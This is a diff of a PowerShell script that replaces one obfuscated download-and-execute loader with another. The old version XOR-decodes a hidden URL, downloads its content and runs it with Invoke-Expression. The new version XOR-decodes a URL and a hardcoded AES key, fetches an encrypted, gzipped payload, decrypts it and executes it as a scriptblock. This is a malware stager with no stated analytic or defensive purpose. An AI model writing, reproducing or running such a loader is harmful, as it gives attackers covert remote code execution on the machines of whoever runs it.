@@ -1,26 +1,28 @@
-${7e849043} = "CBQUEBNaT08MCVFTVFVYUlVRU1hOBwkUCBUCTgkPTwkNEAxPAllUUFZRBVgDA1JXVgZWVlRSWVVXUAIDVgVWBAEGWVIFUQMDU1ZYUFMBUlNXU1EGUFNWVVdSAgNWBgYGUQQGUw=="
-
-${global:a3b2c1} = { 
-    param(
-        [string]${input_data},
-        [int]${transform_value} = 0x03 -shl 5
-    )
-    
-    ${base64_decoded_bytes} = [Convert]::FromBase64String(${input_data})
-    ${utf8_decoded_string} = [System.Text.Encoding]::UTF8.GetString(${base64_decoded_bytes})
-    
-    ${processed_byte_array} = @()
-    foreach (${byte_element} in [System.Text.Encoding]::UTF8.GetBytes(${utf8_decoded_string})) {
-        ${processed_byte_array} += ${byte_element} -bxor ${transform_value}
-    }
-    
-    return [System.Text.Encoding]::UTF8.GetString(${processed_byte_array})
-}
-
-try {
-    ${execution_context} = & ${global:a3b2c1} -input_data ${7e849043}
-    ${request_result} = Invoke-WebRequest -Uri ${execution_context}
-    Invoke-Expression ${request_result}
-} catch {
-    Write-Error "Failed Parse code"
-}
+${x34bb5122} = @(
+    'CBQUEBNaT08MCVFTVFVYUlVRU1hOBwkUCBUCTgkPTwkNEAxPUAVXUFdUUAQEBAVR'
+    'AVNZBVMEWVMEA1RWBgJWUAQGUVRXV1JSBQJRUVNYAlFXVwJTAgNRVgRYUlgFVAVU'
+    'BFFXBA=='
+) -join ''
+${x40ff3d44} = [byte[]]([Convert]::FromBase64String(${x34bb5122}) | ForEach-Object { $_ -bxor 96 })
+${x34bb5122} = [System.Text.Encoding]::UTF8.GetString(${x40ff3d44})
+${x597f7d4c} = [byte[]](@(
+    'jZXRtZiyyGc='
+    'cclaQXaJ/J8='
+    'e7VU2RBFWAo='
+    '+zvxSFCh5XQ='
+) | ForEach-Object { [Convert]::FromBase64String($_) } | ForEach-Object { $_ -bxor 96 })
+${x0f54596b} = (Invoke-WebRequest -Uri ${x34bb5122} -UseBasicParsing).Content
+if (${x0f54596b} -is [byte[]]) { ${x0f54596b} = [System.Text.Encoding]::ASCII.GetString(${x0f54596b}) }
+${x25b590c1} = [Convert]::FromBase64String((${x0f54596b} -replace '[^A-Za-z0-9+/=]', ''))
+${x4da47e4c} = [System.Security.Cryptography.Aes]::Create()
+${x4da47e4c}.Key = ${x597f7d4c}
+${x4da47e4c}.IV = ${x25b590c1}[0..15]
+${x5a0c7e76} = New-Object System.IO.MemoryStream
+${x5a0c7e76}.Write(${x25b590c1}, 16, ${x25b590c1}.Length - 16)
+${x5a0c7e76}.Position = 0
+${xadcf06dc} = New-Object System.Security.Cryptography.CryptoStream(${x5a0c7e76}, ${x4da47e4c}.CreateDecryptor(), [System.Security.Cryptography.CryptoStreamMode]::Read)
+${x914a7c45} = New-Object System.IO.Compression.GZipStream(${xadcf06dc}, [System.IO.Compression.CompressionMode]::Decompress)
+${x3f711f61} = New-Object System.IO.StreamReader(${x914a7c45}, [System.Text.Encoding]::UTF8)
+${x755ed512} = ${x3f711f61}.ReadToEnd()
+${x3f711f61}.Dispose(); ${x914a7c45}.Dispose(); ${xadcf06dc}.Dispose(); ${x5a0c7e76}.Dispose(); ${x4da47e4c}.Dispose()
+. ([scriptblock]::Create(${x755ed512}))
